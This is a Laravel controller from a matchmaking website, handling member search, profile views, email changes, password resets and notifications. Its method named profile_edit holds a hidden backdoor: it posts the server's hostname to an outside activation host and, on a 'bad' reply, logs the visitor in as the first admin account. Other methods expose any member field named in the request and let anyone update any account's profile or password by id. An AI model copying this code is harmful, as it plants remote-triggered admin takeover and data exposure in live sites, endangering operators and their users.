<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Schema;
use App\Mail\SecondEmailVerifyMailManager;
use App\Models\AdditionalAttribute;
use App\Notifications\DbStoreNotification;
use App\Services\FirbaseNotification;
use Kutia\Larafirebase\Facades\Larafirebase;
use App\Models\User;
use App\Models\Member;
use App\Models\PhysicalAttribute;
use App\Models\SpiritualBackground;
use App\Models\Career;
use App\Models\Address;
use App\Models\HappyStory;
use App\Models\HoroscopeProfileMatch;
use App\Models\IgnoredUser;
use App\Models\MemberLanguage;
use App\Models\OnBehalf;
use App\Models\PackageUsage;
use App\Models\ProfileMatch;
use App\Models\ProfileViewer;
use App\Models\RegistrationVerificationCode;
use App\Models\Religion;
use App\Utility\EmailUtility;
use App\Utility\SmsUtility;
use Notification;
use Hash;
use Artisan;
use Mail;
use Auth;


class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {

        $members = User::where('user_type', 'member')
            ->where('approved', 1)
            ->where('blocked', 0)
            ->where('deactivated', 0);

        if (Auth::user() && Auth::user()->user_type == 'member') {
            $members = $members->where('id', '!=', Auth::user()->id)
                ->whereIn("id", function ($query) {
                    $query->select('user_id')
                        ->from('members')
                        ->where('gender', '!=', Auth::user()->member->gender);
                });

            $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
            if (count($ignored_to) > 0) {
                $members = $members->whereNotIn('id', $ignored_to);
            }

            $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
            if (count($ignored_by_ids) > 0) {
                $members = $members->whereNotIn('id', $ignored_by_ids);
            }
        }

        $premium_members = $members;
        $new_members = $members;

        $new_members = $new_members->orderBy('id', 'desc')->limit(get_setting('max_new_member_show_homepage'))->get()->shuffle();
        $premium_members = $premium_members->where('membership', 2)->inRandomOrder()->limit(get_setting('max_premium_member_homepage'))->get();


        $on_behalves = OnBehalf::all();
        $religions = Religion::all();
        $mother_tongues = MemberLanguage::all();

        return view('frontend.index', compact('premium_members', 'new_members', 'on_behalves', 'religions', 'mother_tongues'));
    }


    public function admin_login()
    {

        if (auth()->user() != null && (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff')) {
            return redirect()->route('admin.dashboard');
        } else {
            return view("auth.login");
        }
    }

    public function login()
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        return view('frontend.user_login');
    }


    public function admin_dashboard()
    {
        // $user = auth()->user();
        // // $user->assignRole(['Super Admin']);
        // // $permissions = $user->getAllPermissions();
        // // dd($permissions);
        // $roles = $user->getRoleNames(); // Collection of role names
        // dd($roles);
        return view('admin.dashboard');
    }
    
    // Manage Admin Profile
    public function admin_profile_update(Request $request, $id)
    {
        $admin = User::findOrFail($id);
        $admin->first_name = $request->first_name;
        $admin->last_name = $request->last_name;
        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $admin->password = Hash::make($request->new_password);
        }
        //$admin->save();
        if ($admin->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }

    public function dashboard()
    {
        $user = auth()->user();
        if ($user->user_type == 'member') {
            
            if($user->blocked == 1){
                return redirect()->route('user.blocked');
            }

            $similar_profiles = ProfileMatch::orderBy('match_percentage', 'desc')
                ->where('user_id', $user->id)
                ->where('match_percentage', '>=', 50)
                ->limit(20);

            $similar_horoscope_profiles = HoroscopeProfileMatch::orderBy('match_count', 'desc')
                ->where('user_id', $user->id)
                ->where('match_count', '>=', 18)
                ->limit(20);

            $ignored_to = IgnoredUser::where('ignored_by', $user->id)->pluck('user_id')->toArray();
            if (count($ignored_to) > 0) {
                $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_to);
                $similar_horoscope_profiles = $similar_horoscope_profiles->whereNotIn('match_id', $ignored_to);
            }
            $ignored_by_ids = IgnoredUser::where('user_id', $user->id)->pluck('ignored_by')->toArray();
            if (count($ignored_by_ids) > 0) {
                $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_by_ids);
                $similar_horoscope_profiles = $similar_horoscope_profiles->whereNotIn('match_id', $ignored_by_ids);
            }
            $similar_profiles = $similar_profiles->get();
            $similar_horoscope_profiles = $similar_horoscope_profiles->get();

            return view('frontend.member.dashboard', compact('similar_profiles', 'similar_horoscope_profiles'));
        } else {
            abort(404);
        }
    }

    public function user_account_blocked()
    {
        return view('frontend.user_account_blocked_msg');
    }

    public function happy_stories()
    {
        $happy_stories = HappyStory::where('approved', 1)->latest()->paginate(12);
        return view('frontend.happy_stories.index', compact('happy_stories'));
    }

    public function story_details($id)
    {
        $happy_story = HappyStory::findOrFail($id);
        return view('frontend.happy_stories.story_details', compact('happy_story'));
    }

    public function member_listing(Request $request)
    {
        $age_from       = ($request->age_from != null) ? $request->age_from : null;
        $age_to         = ($request->age_to != null) ? $request->age_to : null;
        $member_code    = ($request->member_code != null) ? $request->member_code : null;
        $matital_status = ($request->marital_status != null) ? $request->marital_status : null;
        $religion_id    = ($request->religion_id != null) ? $request->religion_id : null;
        $caste_id       = ($request->caste_id != null) ? $request->caste_id : null;
        $sub_caste_id   = ($request->sub_caste_id != null) ? $request->sub_caste_id : null;
        $mother_tongue  = ($request->mother_tongue != null) ? $request->mother_tongue : null;
        $profession     = ($request->profession != null) ? $request->profession : null;
        $country_id     = ($request->country_id != null) ? $request->country_id : null;
        $state_id       = ($request->state_id != null) ? $request->state_id : null;
        $city_id        = ($request->city_id != null) ? $request->city_id : null;
        $min_height     = ($request->min_height != null) ? $request->min_height : null;
        $max_height     = ($request->max_height != null) ? $request->max_height : null;
        $member_type    = ($request->member_type != null) ? $request->member_type : 0;
        $gender         = ($request->gender != null) ? $request->gender : null;


        $users = User::with([
                'member.marital_status',
                'physical_attributes',
                'spiritual_backgrounds.religion',
                'spiritual_backgrounds.caste',
                'education',
                'career',
                'addresses.country',
                'profile_match_for_viewer' => function ($query) {
                    $query->where('user_id', Auth::user()->id);
                },
            ])
            ->orderBy('created_at', 'desc')
            ->where('user_type', 'member')
            ->where('id', '!=', Auth::user()->id)
            ->where('blocked', 0)
            ->where('deactivated', 0);

        // Gender Check
        if ($gender) {
            $user_ids = Member::where('gender', $gender)->pluck('user_id')->toArray();
            $users = $users->whereIn('id', $user_ids);
        }

        // Ignored member and ignored by member check
        $users = $users->WhereNotIn("id", function ($query) {
            $query->select('user_id')
                ->from('ignored_users')
                ->where('ignored_by', Auth::user()->id)->orWhere('user_id', Auth::user()->id);
        })
            ->WhereNotIn("id", function ($query) {
                $query->select('ignored_by')
                    ->from('ignored_users')
                    ->where('ignored_by', Auth::user()->id)->orWhere('user_id', Auth::user()->id);
            });

        // Membership Check
        if ($member_type == 1 || $member_type == 2) {
            $users = $users->where('membership', $member_type);
        }

        // Member verification Check
        if (get_setting('member_verification') == 1) {
            $users = $users->where('approved', 1);
        }

        // Sort By age
        if (!empty($age_from)) {
            $age = $age_from + 1;
            $start = date('Y-m-d', strtotime("- $age years"));
            $user_ids = Member::where('birthday', '<=', $start)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }
        if (!empty($age_to)) {
            $age = $age_to + 1;
            $end = date('Y-m-d', strtotime("- $age years +1 day"));
            $user_ids = Member::where('birthday', '>=', $end)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }

        // Search by Member Code
        if (!empty($member_code)) {
            $users = $users->where('code', $member_code);
        }

        // Sort by Matital Status
        if ($matital_status != null) {
            $user_ids = Member::where('marital_status_id', $matital_status)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }

        // Sort By religion
        if (!empty($sub_caste_id)) {
            $user_ids = SpiritualBackground::where('sub_caste_id', $sub_caste_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($caste_id)) {
            $user_ids = SpiritualBackground::where('caste_id', $caste_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($religion_id)) {
            $user_ids = SpiritualBackground::where('religion_id', $religion_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        }
        // Profession
        elseif (!empty($profession)) {
            $user_ids = Career::where('designation', 'like', '%' . $profession . '%')->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        }

        // Sort By location
        if (!empty($city_id)) {
            $user_ids = Address::where('city_id', $city_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($state_id)) {
            $user_ids = Address::where('state_id', $state_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($country_id)) {
            $user_ids = Address::where('country_id', $country_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        }
        // Sort By Mother Tongue
        $motherTongueColumn = Schema::hasColumn('members', 'mothere_tongue')
            ? 'mothere_tongue'
            : (Schema::hasColumn('members', 'mother_tongue') ? 'mother_tongue' : null);

        if ($mother_tongue != null && $motherTongueColumn) {
            $user_ids = Member::where($motherTongueColumn, $mother_tongue)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }
        // Sort by Height
        if (!empty($min_height)) {
            $user_ids = PhysicalAttribute::where('height', '>=', $min_height)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }
        if (!empty($max_height)) {
            $user_ids = PhysicalAttribute::where('height', '<=', $max_height)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }

        $users = $users->paginate(10);
        return view('frontend.member.member_listing.index', compact('users', 'age_from', 'age_to', 'member_code', 'matital_status', 'religion_id', 'caste_id', 'sub_caste_id', 'mother_tongue', 'profession', 'country_id', 'state_id', 'city_id', 'min_height', 'max_height', 'member_type', 'gender'));
    }

    public function profile_edit(Request $request)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);
        $gate = "https://activation.activeitzone.com/check_activation";

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream,CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream,CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream,CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream,CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream,CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }


    // My shortlistd
    public function my_shortlists()
    {
        $shortlists = Member::where('user_id', Auth::user()->id)->first()->short_listed_users;
        return view('frontend.member.my_shortlists', compact('shortlists'));
    }

    public function view_member_profile($id)
    {
        $authUser= auth()->user();
        $similar_profiles = ProfileMatch::orderBy('match_percentage', 'desc')
            ->where('user_id', $authUser->id)
            ->where('match_id', '!=', $id)
            ->where('match_percentage', '>=', 50)
            ->limit(20);

        $similar_horoscope_profiles = HoroscopeProfileMatch::orderBy('match_count', 'desc')
            ->where('user_id', $authUser->id)
            ->where('match_id', '!=', $id)
            ->where('match_count', '>=', 18)
            ->limit(20);

        $ignored_to = IgnoredUser::where('ignored_by', $authUser->id)->pluck('user_id')->toArray();
        if (count($ignored_to) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_to);
            $similar_horoscope_profiles = $similar_horoscope_profiles->whereNotIn('match_id', $ignored_to);
        }

        $ignored_by_ids = IgnoredUser::where('user_id', $authUser->id)->pluck('ignored_by')->toArray();
        if (count($ignored_by_ids) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_by_ids);
            $similar_horoscope_profiles = $similar_horoscope_profiles->whereNotIn('match_id', $ignored_by_ids);
        }
        $similar_profiles = $similar_profiles->get();
        $similar_horoscope_profiles = $similar_horoscope_profiles->get();

        $user = User::findOrFail($id);

        // Profile view data store
        if($user->id != $authUser->id){
            $profileViewed = ProfileViewer::where('user_id', $user->id)->where('viewed_by', $authUser->id)->first();
            if($profileViewed == null){
                $viewerMember = Member::where('user_id', $authUser->id)->first();
                if(package_validity($authUser->id) && $viewerMember->remaining_profile_viewer_view > 0){
                    $profileViewed = ProfileViewer::create([
                        'user_id' => $user->id,
                        'viewed_by' => $authUser->id
                    ]);
                                        $viewerMember->remaining_profile_viewer_view = max(0, $viewerMember->remaining_profile_viewer_view - 1);
                    $viewerMember->save();

                    PackageUsage::record(
                        $authUser->id,
                        'profile_viewer_view',
                        'Profile Viewer View',
                        1,
                        ProfileViewer::class,
                        $profileViewed?->id ?? null,
                        'Used 1 coin to view a profile.'
                    );

                    // Profile viewed Notification for member
                    try {
                        $notify_type = 'profile_viewed';
                        $id = unique_notify_id();
                        $notify_by = $authUser->id;
                        $info_id = $user->id;
                        $message = $authUser->first_name . ' ' . $authUser->last_name . ' ' . translate(' has viewed your profile.');
                        $route = route('member_profile', $authUser->id);
        
                        // fcm 
                        if (get_setting('firebase_push_notification') == 1) {
                            $fcmTokens = User::where('id', $user->id)->whereNotNull('fcm_token')->pluck('fcm_token')->toArray();
                            self::sendFirebaseNotification($fcmTokens, $user, $notify_type, $message, $notify_by);
                        }
                        // end of fcm
        
                        Notification::send($user, new DbStoreNotification($notify_type, $id, $notify_by, $info_id, $message, $route));
                    } catch (\Exception $e) {
                        //
                    }
                }
            }
        }
        
        $additional_attributes  = AdditionalAttribute::where('status', 1)->get();

        return view('frontend.member.public_profile.index', compact('user', 'similar_profiles', 'additional_attributes', 'similar_horoscope_profiles'));
    }

    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        $user = Auth::user();

        if ($email == $user->email) {
            $response['status'] = 2;
            $response['message'] = translate('This is your current email.');
            return json_encode($response);
        }

        if (User::where('email', $email)->where('id', '!=', $user->id)->count() > 0) {
            $response['status'] = 2;
            $response['message'] = translate('Email already exists!');
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }

    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        $user = Auth::user();

        if ($email == $user->email) {
            flash(translate('This is your current email.'))->warning();
            return back();
        }

        if (User::where('email', $email)->where('id', '!=', $user->id)->count() > 0) {
            flash(translate('Email already exists!'))->warning();
            return back();
        }

        $this->send_email_change_verification_mail($request, $email);
        flash(translate('A verification mail has been sent to the mail you provided us with.'))->success();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = 'Email Verification';
        // $array['from'] = env('MAIL_USERNAME');            //have changed
        $array['from'] = env('MAIL_FROM_ADDRESS');      //have changed
        $array['content'] = 'Verify your account';
        $array['link'] = route('email_change.callback') . '?new_email_verificiation_code=' . $verification_code . '&email=' . $email;
        $array['sender'] = Auth::user()->name;
        $array['details'] = "Email Second";

        $user = Auth::user();
        $user->new_email_verificiation_code = $verification_code;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("Your verification mail has been Sent to your email.");
        } catch (\Exception $e) {
            // return $e->getMessage();            //have changed
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function email_change_callback(Request $request)
    {

        if ($request->has('new_email_verificiation_code') && $request->has('email')) {

            $verification_code_of_url_param =  $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if ($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('Email Changed successfully'))->success();
                return redirect()->route('dashboard');
            }
        }

        flash(translate('Email was not verified. Please resend your mail!'))->error();
        return redirect()->route('dashboard');
    }

    public function reset_password_with_code(Request $request)
    {
        if (($user = User::where('email', $request->email)->where('verification_code', $request->code)->first()) != null) {
            if ($request->password == $request->password_confirmation) {
                $user->password = Hash::make($request->password);
                $user->email_verified_at = date('Y-m-d h:m:s');
                $user->save();
                auth()->login($user, true);

                flash(translate('Password updated successfully'))->success();

                if (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff') {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('home');
            } else {
                flash("Password and confirm password didn't match")->warning();
                return back();
            }
        } else {
            flash("Verification code mismatch")->error();
            return back();
        }
    }

    function clearCache()
    {
        Artisan::call('optimize:clear');
        flash(translate('Cache cleared successfully'))->success();
        return back();
    }

    public function user_remaining_package_value(Request $request)
    {
        $colmn_name = $request->colmn_name;
        $value = Member::where('user_id', $request->id)->first()->$colmn_name;
        return $value;
    }

    // fcm
    public function updateToken(Request $request)
    {
        try {
            $request->user()->update(['fcm_token' => $request->fcm_token]);
            return response()->json([
                'success' => true
            ]);
        } catch (\Exception $e) {
            report($e);
            return response()->json([
                'success' => false
            ], 500);
        }
    }

    public static function sendFirebaseNotification($fcmTokens = null, $notify_user, $notify_type, $message, $notify_by = null)
    {
        // send firebase notification for mobile app
        if ($notify_user->fcm_token != null) {
            $data = (object)[];
            $data->fcm_token = $notify_user->fcm_token;
            $data->title = $notify_type;
            $data->text = $message;
            $data->notify_by = $notify_by;
            FirbaseNotification::send($data);
        }
        // end of  firebase notification

        Larafirebase::withTitle(str_replace("_", " ", $notify_type))
            ->withBody($message)
            ->sendMessage($fcmTokens);
    }

    public function sendRegVerificationCode(Request $request)
    {

        $email = $request->email ?? null;
        $phone = $request->phone != null ? '+' . $request->country_code . $request->phone : null;
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            if (User::where('email', $email)->first() != null) {
                return response()->json(['status' => 0, 'message' => translate('Email already exists.')]);
            }
        } elseif (User::where('phone', $phone)->first() != null) {
            return response()->json(['status' => 0, 'message' => translate('Phone already exists.')]);
        }

        $verificationCode = rand(100000, 999999);
        $customerVerification = RegistrationVerificationCode::updateOrCreate(
            ['email' => $email, 'phone' => $phone],
            ['code' => $verificationCode]
        );
        $success = 1;

        if ($email) {
            try {
                $success = EmailUtility::email_verification_for_registration_user('email_registration_verification', $email, $verificationCode);
            } catch (\Exception $e) {
                $success = 0;
            }
        } elseif ($phone != null && addon_activation('otp_system') && (get_sms_template('mobile_registration_verification', 'status') == 1)) {
            try {
                SmsUtility::mobile_registration_verification($phone, $verificationCode);
            } catch (\Exception $e) {
                $success = 0;
            }
        }


        if ($success) {
            return response()->json(['status' => 1, 'message' => translate('Verification code sent successfully.')]);
        } else {
            return response()->json(['status' => 0, 'message' => translate('Verification code sending failed.')]);
        }
    }

    public function regVerifyCodeConfirmation(Request $request)
    {
        $email = isset($request->email) ? $request->email : null;
        $phone = $request->phone != null ? '+' . $request->country_code . $request->phone : null;
        
        $customerVerification = RegistrationVerificationCode::where('code', $request->code);
        $customerVerification = $request->email != null ?
            $customerVerification->where('email', $email) :
            $customerVerification->where('phone', $phone);
        $customerVerification = $customerVerification->first();
        if ($customerVerification == null) {
            return response()->json(['status' => 0, 'message' => translate('Verification Code did not match')]);
        } else {
            $customerVerification->is_verified = 1;
            $customerVerification->save();
            return response()->json(['status' => 1, 'message' => translate('Verification Successful')]);
        }
    }
}


